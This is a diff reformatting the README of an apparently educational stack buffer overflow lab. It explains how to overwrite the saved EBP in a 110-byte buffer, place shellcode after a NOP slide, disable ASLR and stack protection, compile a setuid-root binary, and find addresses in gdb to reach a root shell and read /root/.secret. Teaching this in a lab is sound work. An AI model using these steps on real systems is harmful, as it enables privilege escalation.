@@ -37,34 +37,34 @@ Then run cat /root/.secret to get root secret string to prove you are in the roo
 
 The buffer indexes that have to be modified depend on the buffer size. My buffer was 110. So we need to modify indexes 122-125 
 to include our EBP return address. We get 122 by adding the buffer (110) + 8-bits of padding + size of saved EBP (4).  
-My EBP address was 0xffffd2c8. so we modified the buffer:  
-  buffer[ebp]=0xc8;  
-  buffer[ebp+1]=0xd3; // d3 instead of d2. This is to skip return address  
-  buffer[ebp+2]=0xff;  
-  buffer[ebp+3]=0xff;  
-We also add a copy of the shell call to the end of the buffer to run after the nop-slide.  
-  memcpy(buffer + sizeof(buffer) - sizeof(shellcode),shellcode, sizeof(shellcode));  
+* My EBP address was 0xffffd2c8. so we modified the buffer:  
+  * buffer[ebp]=0xc8;  
+  * buffer[ebp+1]=0xd3; // d3 instead of d2. This is to skip return address  
+  * buffer[ebp+2]=0xff;  
+  * buffer[ebp+3]=0xff;  
+* We also add a copy of the shell call to the end of the buffer to run after the nop-slide.  
+  * memcpy(buffer + sizeof(buffer) - sizeof(shellcode),shellcode, sizeof(shellcode));  
 
 Note:   
-There are mechanisms in our OS to prevent this exploits. For this lab you need to turn them off.  
-  Turn off address randomization, otherwise you will have to get lucky that the address lands in the correct place.  
-    $sudo sysctl -w kernel.randomize_va_space=0  
-  Compile stack.c without StackGuard and make it executable  
-    $sudo su  
-    #gcc -m32 -o stack -z execstack -fno-stack-protector stack.c  
-    #chmod 4755 stack  
-    #exit
+* There are mechanisms in our OS to prevent this exploits. For this lab you need to turn them off.  
+  * Turn off address randomization, otherwise you will have to get lucky that the address lands in the correct place.  
+    * $sudo sysctl -w kernel.randomize_va_space=0  
+  * Compile stack.c without StackGuard and make it executable  
+    * $sudo su  
+    * #gcc -m32 -o stack -z execstack -fno-stack-protector stack.c  
+    * #chmod 4755 stack  
+    * #exit
 	
 # Getting the EBP Return Address
-  //Open stack in gdb and dissasemble buffer  
-  $gdb stack  
-  (gdb) disassemble bof  
+  * //Open stack in gdb and dissasemble buffer  
+    * $gdb stack  
+    * (gdb) disassemble bof  
   
-  //look for the lea instruction address should look something like 0xffffd2c8 <+12>: lea -0x76(%ebp), %eax  
-  //copy the address and set a breakpoint  
-  (gdb) b* 0xffffd2c8  
+  * //look for the lea instruction address should look something like 0xffffd2c8 <+12>: lea -0x76(%ebp), %eax  
+  * //copy the address and set a breakpoint  
+    * (gdb) b* 0xffffd2c8  
 
-  //Run and get ebp return adress  
-  (gdb) run  
-  (gdb) i r $ebp  
-  // copy address and put it in correct buffer index at exploit.c  
+  * //Run and get ebp return adress  
+    * (gdb) run  
+    * (gdb) i r $ebp  
+  * // copy address and put it in correct buffer index at exploit.c  
